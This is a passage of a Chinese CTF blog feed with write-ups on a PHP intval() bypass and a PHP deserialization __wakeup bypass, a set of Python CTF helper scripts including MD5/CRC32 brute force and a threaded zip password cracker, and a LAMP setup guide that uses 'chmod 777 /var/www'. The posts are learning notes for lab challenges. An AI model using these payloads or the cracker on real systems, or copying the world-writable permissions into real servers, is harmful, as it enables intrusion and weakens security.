$info;</span><br></pre></td></tr></table></figure><p>直接来看代码<br>分析过后我们发现这段代码得满足四个条件<br>1.必须是字符串<br>2.参数number与变换为整形再变换为字符串的number相等<br>3.number参数反转后必须相等<br>4.不是水仙花数</p><p>似乎1跟2条件冲突，3跟4条件也冲突，如何构造呢？<br>下面就给出两种办法</p><p>1.<code>number=0e00%00或者0e00%20</code><br>  这里的%00表示空字符串，%20表示是空格，这样一来就满足了上述四个条件<br>  利用%00绕过第一个字符串判断，然后第二个条件都是变为0再比较，下面更是满足3和4的条件</p><p>2.利用函数溢出的方法<br><code>number=2147483647%00</code><br>从这一个题目里面学到一个新点<br>那就是Intval最大的值取决于操作系统。<br>32位系统最大带符号的 integer 范围是 <code>-2147483648</code> 到 <code>2147483647</code>。举例，在这样的系统上，<code>intval(‘1000000000000’)</code> 会返回 <code>2147483647</code>。<br>所以在第三个条件的时候翻转变成7463847412再变成整形也是<code>2147483647</code>，绕过第三个条件，第四个条件也就一起绕过了。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><code>intval()</code>转换的时候，会将从字符串的开始进行转换知道遇到一个非数字的字符。<br>即使出现无法转换的字符串，<code>intval()</code>不会报错而是返回0。</p><p>所以呢现在这个intval函数我觉得的有几个点可以去利用的<br>1.溢出<br>2.16进制通常是配合<code>is_numeric()</code>使用<br>3.科学计数法<br>下面就是一个科学计数法的例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump((int)(<span class="string">'1e-1000'</span>)&gt;<span class="number">0</span>);</span><br><span class="line">var_dump(<span class="string">'1e-1000'</span>&gt;<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bool(<span class="keyword">true</span>)</span><br><span class="line">bool(<span class="keyword">false</span>)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump((int)(<span class="string">'1e-10'</span>)&gt;<span class="number">0</span>);</span><br><span class="line">var_dump(<span class="string">'1e-10'</span>&gt;<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bool(<span class="keyword">true</span>)</span><br><span class="line">bool(<span class="keyword">true</span>)</span><br></pre></td></tr></table></figure><p>在科学计数法字符串转换为数字时，如果 E 后面的数小于某个值会弄成 double 类型，再强制转换为 int 类型时可能会有奇妙的结果，测试发现某变量为 1e-1000 时已经可以触发这个漏洞绕过两个检查，使得某变量既大于 0 又不大于 0。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这个题目好像做了两遍了。。。。从这道题目里面学到的东西还是需要记录一下&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>小结一波CTF里面可能用到的脚本</title>
    <link href="0verwatch.top/2018/03/14/CTFpython/"/>
    <id>0verwatch.top/2018/03/14/CTFpython/</id>
    <published>2018-03-14T09:16:33.000Z</published>
    <updated>2018-05-20T02:20:57.397Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本人渣渣，只是为了总结自己的学习过程，请大佬莫喷</p><a id="more"></a><h2 id="base64解码"><a href="#base64解码" class="headerlink" title="base64解码"></a>base64解码</h2><p>有时候题目会让你把base全家桶用上，你就可以像下面这样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">str1 = <span class="string">'your string'</span></span><br><span class="line"><span class="keyword">print</span> base64.b64decode(str1)</span><br><span class="line"><span class="keyword">print</span> base64.b32decode(str1)</span><br><span class="line"><span class="keyword">print</span> base64.b16decode(str1)</span><br></pre></td></tr></table></figure><h2 id="requests库"><a href="#requests库" class="headerlink" title="requests库"></a>requests库</h2><p>专门用于快速提交网页所需要的东西或者是多次访问你提交的东西<br>参考文章：<a href="http://www.bxsteam.xyz/2017/04/26/python-requests%e6%80%bb%e7%bb%93/" target="_blank" rel="noopener">http://www.bxsteam.xyz/2017/04/26/python-requests%e6%80%bb%e7%bb%93/</a><br>一般都是下面的形式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'your url'</span></span><br><span class="line"></span><br><span class="line">s  = requests.Session()</span><br><span class="line">r = s.get(url)</span><br><span class="line">str1  = r.headers[<span class="string">'flag'</span>].split(<span class="string">':'</span>)[<span class="number">1</span>]   <span class="comment">#抓包看清楚是啥才行，有可能不是flag，是其他的</span></span><br><span class="line">data = &#123;<span class="string">'key'</span>:str1&#125;</span><br><span class="line"><span class="keyword">print</span> s.post(url,data).text</span><br><span class="line"><span class="keyword">print</span> s.post(url,data).content</span><br></pre></td></tr></table></figure><p>有时候要你尽可能快，可能你得尽量缩小代码量达到更快的效果</p><h2 id="字符串的匹配"><a href="#字符串的匹配" class="headerlink" title="字符串的匹配"></a>字符串的匹配</h2><p>运用正则re<br>下面是一道匹配正确MD5题目所写出来的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">md51 = <span class="string">'your wrong md5'</span></span><br><span class="line">pattern = <span class="string">r'[1-9a-z]'</span></span><br><span class="line">str1 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> md51:</span><br><span class="line"><span class="keyword">if</span> re.search(pattern,i):</span><br><span class="line">str1 = str1+i</span><br><span class="line"><span class="keyword">print</span> str1</span><br></pre></td></tr></table></figure><h2 id="爆破MD5的"><a href="#爆破MD5的" class="headerlink" title="爆破MD5的"></a>爆破MD5的</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> string.uppercase:</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> string.uppercase:</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> string.uppercase:</span><br><span class="line"> a=<span class="string">'TASC'</span>+i+<span class="string">'O3RJMV'</span>+j+<span class="string">'WDJKX'</span>+k+<span class="string">'ZM'</span></span><br><span class="line">             b=md5.md5(a).hexdigest()</span><br><span class="line">              <span class="keyword">if</span>(b[<span class="number">0</span>:<span class="number">5</span>]==<span class="string">'e9032'</span>):  </span><br><span class="line">                             <span class="keyword">print</span> b</span><br></pre></td></tr></table></figure><h3 id="md5模块的各参数"><a href="#md5模块的各参数" class="headerlink" title="md5模块的各参数"></a>md5模块的各参数</h3><p>md5.md5(s)</p><pre><code>返回字符串s的md5</code></pre><p>md5.update(arg)</p><pre><code>用string参数arg更新md5对象。即将要计算arg的消息摘要值。</code></pre><p>md5.digest()</p><pre><code>返回16字节的摘要，由传给update的string生成，摘要没有ascii字符</code></pre><p>md5.hexdigest()</p><pre><code>以16进制的形式返回摘要，32位</code></pre><p>  还有一种hashlib,这东西好像是py3只能用它了，我试了一下，好像不怎么行，跑不出答案。。。但是它功能很强大，还有sha1算法啥的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib </span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> string.uppercase:</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> string.uppercase:</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> string.uppercase:</span><br><span class="line">a = <span class="string">'TASC'</span>+i+<span class="string">'O3RJMV'</span>+j+<span class="string">'WDJKX'</span>+k+<span class="string">'ZM'</span></span><br><span class="line"><span class="comment">#c = hashlib.new('md5', string=a).hexdigest()</span></span><br><span class="line">b = hashlib.md5(a)</span><br><span class="line">c = b.hexdigest()</span><br><span class="line"><span class="keyword">if</span>(c[<span class="number">0</span>:<span class="number">5</span>]==<span class="string">'e90032'</span>):</span><br><span class="line"><span class="keyword">print</span> c</span><br></pre></td></tr></table></figure><h2 id="CRC32爆破"><a href="#CRC32爆破" class="headerlink" title="CRC32爆破"></a>CRC32爆破</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string </span><br><span class="line"></span><br><span class="line">dic=string.printable     <span class="comment">#各种打印字符</span></span><br><span class="line"></span><br><span class="line">crc = <span class="string">'''你的输入 '''</span>     <span class="comment"># 记得要以0x开头</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackCrc</span><span class="params">(crc)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dic :</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> dic:</span><br><span class="line"><span class="keyword">for</span> q <span class="keyword">in</span> dic:</span><br><span class="line">s=i+j+p+q</span><br><span class="line"><span class="keyword">if</span> crc == (binascii.crc32(s) &amp; <span class="number">0xffffffff</span>):</span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure><p>在 Python 2.x 的版本中，binascii.crc32 所计算出來的 CRC 值域为[-2^31, 2^31-1] 之间的有符号整数，为了要与一般CRC 结果作比对，需要将其转为无符号整数，所以加上&amp; 0xffffffff来进行转换。如果是 Python 3.x 的版本，其计算结果为 [0, 2^32-1] 间的无符号整数，因此不需额外加上&amp; 0xffffffff 。</p><h2 id="进行异或运算"><a href="#进行异或运算" class="headerlink" title="进行异或运算"></a>进行异或运算</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">f1 = open(<span class="string">'文件路径'</span>,<span class="string">'rb'</span>)  <span class="comment"># 此处rb是指以二进制读取文件,二进制才能进行异或运算的呀233333</span></span><br><span class="line">f2 = open(<span class="string">'文件路径'</span>,<span class="string">'rb'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = <span class="string">""</span>.join(f1.readlines())  <span class="comment">#这里的readlines跟read差不多，readlines把全文读取后按照行的形式存进列表，所以一版一行行遍历我们用for i in f.readlines()。。而read直接简单粗暴，而readline简单读取一行,强行复习一波python</span></span><br><span class="line">b = <span class="string">""</span>.join(f2.readlines())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s= <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i,j <span class="keyword">in</span> zip(a,b):  <span class="comment">#这里的zip是指多个序列或者是迭代器的元素，组合成元组。返回的元组的长度是所有输入序列中最短的</span></span><br><span class="line">s+=chr(ord(i)^ord(j))</span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure><h2 id="zip暴力破解"><a href="#zip暴力破解" class="headerlink" title="zip暴力破解"></a>zip暴力破解</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extractFile</span><span class="params">(zfile,pwd)</span>:</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">zfile.extractall(pwd = pwd)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'password found : %s'</span> % pwd</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span> </span><br><span class="line">zFile = zipfile.ZipFile(<span class="string">'your zip'</span>) </span><br><span class="line">passFile = open(<span class="string">'dictionary.txt'</span>) </span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> passFile.readlines(): </span><br><span class="line">password = line.strip(<span class="string">'\n'</span>) </span><br><span class="line">t = Thread(target=extractFile, args=(zFile, password)) <span class="comment">#函数性编程的影子。因为第一个参数是函数。。</span></span><br><span class="line">t.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>其实python真的很强大，做题的时候还是有类似一些盲注之类的题目也会用到它，只是我是菜鸡，只能凭自己理解写一下，以后希望有时间还能补充一下。。。。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本人渣渣，只是为了总结自己的学习过程，请大佬莫喷&lt;/p&gt;
    
    </summary>
    
      <category term="编程语言" scheme="0verwatch.top/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="python" scheme="0verwatch.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Ubantu下部署LAMP以及复现一道CTF题目</title>
    <link href="0verwatch.top/2018/03/11/Ubantu-Web/"/>
    <id>0verwatch.top/2018/03/11/Ubantu-Web/</id>
    <published>2018-03-11T14:08:15.000Z</published>
    <updated>2018-05-20T06:38:04.610Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天下午用虚拟机在Windows装配服务器。。觉得用类似phpstudy的傻瓜包太简单了，但是对比之下，Linux就值得好好记录一番了，本人渣渣，请勿喷。。。</p><a id="more"></a><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>通过这一次部署学会了如何搭建LAMP，还顺便还原一道CTF反序列化题目。。。</p><p>同时感谢大饼的服务器，虽然搞到后面装PHP的时候可能把他服务器有些东西搞坏了，所以我还是用自己的虚拟机模拟一遍吧，毕竟我是个新手，命令行+可视化对于初学者来说组合还是比较不错的</p><p>我用的是虚拟机下Ubuntu14.04搭建LAMP环境搭建 Apache、MySQL、PHP</p><h3 id="安装顺序："><a href="#安装顺序：" class="headerlink" title="安装顺序："></a>安装顺序：</h3><p>一般来说比较建议的顺序是Mysql Apache 最后安装PHP，PHP一定要安装在这两个后面，因为是要依赖Apache和Mysql的服务的。（反正我用快照恢复两三次）</p><p>下面的命令都是在root权限下执行的，对了，我使用的Xshell连接虚拟机的桥接模式下的乌班图，记得转到root权限啊233333</p><h3 id="MysSQL安装："><a href="#MysSQL安装：" class="headerlink" title="MysSQL安装："></a>MysSQL安装：</h3><p>打开命令行输入 ：<code>apt-get install mysql-server</code>  选择y<br>安装的期间会出现输入Mysql的管理员密码的提示，设置一下Mysql的密码即可：<br><img src="http://img.blog.csdn.net/20180311215529693?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><p>装完后输入<code>netstat -tap | grep mysql</code> 显示监听的端口即表示安装成功</p><h3 id="安装Apache"><a href="#安装Apache" class="headerlink" title="安装Apache"></a>安装Apache</h3><p>在命令行输入<code>apt-get install apache2</code> 选择y<br>然后打开乌班图的浏览器输入127.0.0.1出现下面的画面就成功了<br><img src="http://img.blog.csdn.net/20180311215653198?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h3 id="安装PHP"><a href="#安装PHP" class="headerlink" title="安装PHP"></a>安装PHP</h3><p>输入apt-get install php5 libapache2-mod-php5<br><img src="http://img.blog.csdn.net/20180311215710581?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>不要怪我安装的版本太低。。。因为靶场有些漏洞需要低配的php</p><p>下一步很重要</p><h3 id="www目录提权"><a href="#www目录提权" class="headerlink" title="www目录提权"></a>www目录提权</h3><p>将www目录更改下所有权以便可以新建文档 输入<code>chmod 777 /var/www</code><br><img src="http://img.blog.csdn.net/20180311215816292?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><p>新建一个php文件检验一下啊<br>强大的vim编辑器出来了<br>新建一个文档： <code>vi /var/www/html/phpinfo.php</code></p><p>按下i键编辑文件 输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">   phpinfo();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ESC 后输入:wq保存退出。<br>如果还不懂一些常用的vim命令的话，可以看一下我以前写的文章<a href="https://0verwatch.top/2018/02/23/Linuxcaiji/">我以前写的文章</a></p><h3 id="重启下Apache："><a href="#重启下Apache：" class="headerlink" title="重启下Apache："></a>重启下Apache：</h3><p>输入<code>/etc/init.d/apache2 restart</code> </p><p>在乌班图的浏览器中输入 <code>127.0.0.1/phpinfo.php</code>,出现PHP的相关配置信息即表示成功<br><img src="http://img.blog.csdn.net/20180311220204350?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h3 id="安装相关的PHP与Mysql的扩展包："><a href="#安装相关的PHP与Mysql的扩展包：" class="headerlink" title="安装相关的PHP与Mysql的扩展包："></a>安装相关的PHP与Mysql的扩展包：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install php5-mysql php5-curl php5-gd php5-intl php-pear php5-imagick php5-imap php5-mcrypt php5-memcache php5-ming php5-ps php5-pspell php5-recode php5-snmp php5-sqlite php5-tidy php5-xmlrpc php5-xsl;</span><br></pre></td></tr></table></figure><p>为了方便的管理数据库 ，安装phpmyadmin。<br>命令行输入<code>apt-get install phpmyadmin</code>,中间会出现一次输入管理密码的提示，按照提示输入即可，这里我好像输了3次密码。。。。<br><img src="http://img.blog.csdn.net/20180311220251787?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><p>因为上面这东西默认是安装在/usr/share/下，所以你的phpmyadmin在/usr/share下可以找到<br><img src="http://img.blog.csdn.net/2018031122030414?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><p>网上到了这一步有的人用直接复制。。。可是我尝试不行，只能显示一片空白，我也不能解决，最后只能删掉重来。。。。只能用软连接的方法，就是类似Windows的快捷方式<br><img src="http://img.blog.csdn.net/20180311220340444?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>回到<code>/var/www/html</code>，输入命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /usr/share/phpmyadmin phpmyadmin</span><br></pre></td></tr></table></figure><p>打开浏览器，输入127.0.0.1/phpmyadmin，出现了熟悉的界面<br><img src="http://img.blog.csdn.net/20180311220419259?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><p>到这里环境就应该配好了</p><p>下面我们就用Xftp这款工具把题目源码传上去<br><img src="http://img.blog.csdn.net/20180311220455919?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><p>先输入ifconfig查看ip<br><img src="http://img.blog.csdn.net/20180311220508825?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><p>让我们见证奇迹，回到自己的本地的浏览器<br>输入那道题目的ip，题目复现了，啊哈哈<br><img src="http://img.blog.csdn.net/20180311220524646?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br><img src="http://img.blog.csdn.net/201803112205337?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这样想想我们其实还可以在本地输入服务器ip去检查服务器是否安装好各种环境。。。。。。。。可能这就是只有命令行时候的做法吧？？。。。现在还不清楚，可能过段时间会有更深刻的理解。。</p><p>希望学到的这些，在跟大饼的项目开发过程中能有所用途吧。。。。。。</p><p>参考文章：<br><a href="https://jingyan.baidu.com/article/9113f81b24aa9a2b3214c721.html" target="_blank" rel="noopener">https://jingyan.baidu.com/article/9113f81b24aa9a2b3214c721.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;今天下午用虚拟机在Windows装配服务器。。觉得用类似phpstudy的傻瓜包太简单了，但是对比之下，Linux就值得好好记录一番了，本人渣渣，请勿喷。。。&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="0verwatch.top/categories/Linux/"/>
    
    
      <category term="Linux" scheme="0verwatch.top/tags/Linux/"/>
    
      <category term="环境部署" scheme="0verwatch.top/tags/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    
  </entry>
  
  <entry>
    <title>浅析cumt平台上的一道反序列化题目</title>
    <link href="0verwatch.top/2018/03/11/cumtphpfanxuliehua/"/>
    <id>0verwatch.top/2018/03/11/cumtphpfanxuliehua/</id>
    <published>2018-03-11T03:37:51.000Z</published>
    <updated>2018-05-20T06:35:31.331Z</updated>
    
    <content type="html"><![CDATA[<h2 id="听说你会面向对象"><a href="#听说你会面向对象" class="headerlink" title="听说你会面向对象"></a>听说你会面向对象</h2><p>这题用了反序列化的一个漏洞，如果还不知道什么是反序列化，参考下面的文章<br><a href="http://www.freebuf.com/column/151447.html" target="_blank" rel="noopener">http://www.freebuf.com/column/151447.html</a><br><a id="more"></a></p><p>这一题其实还是很简单的，只是我不知道php反序列化的一个漏洞，那就是<strong>PHP当序列化字符串中表示对象属性数的值大于真实的属性个数时会跳过wakeup()的执行</strong></p><p>因为我一开始构造的类是这样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Admin();</span><br><span class="line">$a-&gt;file=<span class="string">'flag.php'</span>;</span><br><span class="line">print_r (serilize($a));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后得到 <code>data=O:5:&quot;Admin&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code><br>然后发现是这个样子的<br><img src="http://img.blog.csdn.net/20180311113453476?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>肯定是在序列化的时候<strong>wakeup()函数在搞鬼，后面加了1.。。。<br>其实这段代码主要是利用了_</strong>destruct()函数把文件内容会显示出来<br>于是就利用上面说的那一个漏洞改一下payload：data=O:5:”Admin”:2:{s:4:”file”;s:8:”flag.php”;}<br>flag就出来了<br><img src="http://img.blog.csdn.net/20180311113509536?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><p>看来自己对于反序列化还是了解甚小，不得不承认自己还是个菜鸡，参考博文<br><a href="http://www.voidcn.com/article/p-ybezdnbn-bmu.html" target="_blank" rel="noopener">http://www.voidcn.com/article/p-ybezdnbn-bmu.html</a><br><a href="https://mp.weixin.qq.com/s__biz=MzIzOTQ5NjUzOQ%3D%3D&amp;mid=2247483735&amp;idx=1&amp;sn=a886de95750b069c87961ce336fe2f6d&amp;chksm=e9287d63de5ff475a095abe626d386c94509f14298b46b3271c1f9776691ffe2e531024a12f9&amp;mpshare=1&amp;scene=23&amp;srcid=0907F7nrIu4WchffyQBy9jks#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s__biz=MzIzOTQ5NjUzOQ%3D%3D&amp;mid=2247483735&amp;idx=1&amp;sn=a886de95750b069c87961ce336fe2f6d&amp;chksm=e9287d63de5ff475a095abe626d386c94509f14298b46b3271c1f9776691ffe2e531024a12f9&amp;mpshare=1&amp;scene=23&amp;srcid=0907F7nrIu4WchffyQBy9jks#rd</a></p>]]></content>
    
    <summary type="html">
    
